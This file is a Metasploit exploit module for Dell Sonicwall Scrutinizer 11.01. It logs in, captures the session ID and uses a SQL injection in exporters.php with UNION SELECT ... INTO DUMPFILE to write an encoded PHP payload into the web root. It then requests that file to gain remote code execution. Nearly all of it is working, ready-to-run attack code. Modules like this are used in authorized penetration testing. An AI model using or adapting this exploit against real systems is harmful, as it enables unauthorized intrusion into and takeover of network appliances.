# This module requires Metasploit: http//metasploit.com/download
##
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Dell Sonicwall Scrutinizer 11.01 Authenticated Code Execution",
      'Description'    => %q{
      Dell Sonicwall Scrutinizer 11.01 is vulnerable to an authenticated SQL injection that allows
      an attacker to write arbitrary files to the file system. This vulnerability is used
      to write a PHP script to the file system to gain RCE.
 
      This was tested on the Dell Scrutinizer appliance available to download on mysonicwall.com
      },
      'License'        => MSF_LICENSE,
      'Author'         => [],
      'References'     => [],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Dell Sonicwall Scrutinizer 11.01', {}],],
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))
 
      register_options(
      [
          OptString.new('TARGETURI', [ true, "Base Application path", "/" ]),
          OptString.new('USERNAME', [ false,  "The username to authenticate as"]),
          OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
      ], self.class)
  end
 
  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),
      'vars_get' => {
        'name' => datastore['USERNAME'],
        'pwd' => datastore['PASSWORD']
      }
    })
 
    res.body =~ /"userid":"(.*)","sessionid":"(.*)"/
    sessionid = $2
 
    cookie = "cookiesenabled=1;sessionid=#{sessionid};userid=#{$1}"
 
    hexstr = ("<?php " + payload.encoded + " ?>").bytes.map { |b| sprintf("%02x",b) }.join
 
    post = {
      'methodDetail' => "-6045 UNION ALL SELECT NULL,NULL,NULL,0x#{hexstr},NULL,NULL,NULL," +
                        "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL " +
                        "INTO DUMPFILE '/home/plixer/scrutinizer/html/d4d/#{sessionid}.php'#"
    }
 
    register_files_for_cleanup("/home/plixer/scrutinizer/html/d4d/#{sessionid}.php")
 
    send_request_cgi({
      'uri' => normalize_uri(target_uri, '/d4d/exporters.php'),
      'vars_get' => post,
      'cookie' => cookie
    })
 
    send_request_cgi({ 'uri' => normalize_uri(target_uri, "/d4d/#{sessionid}.php")})
  end
end
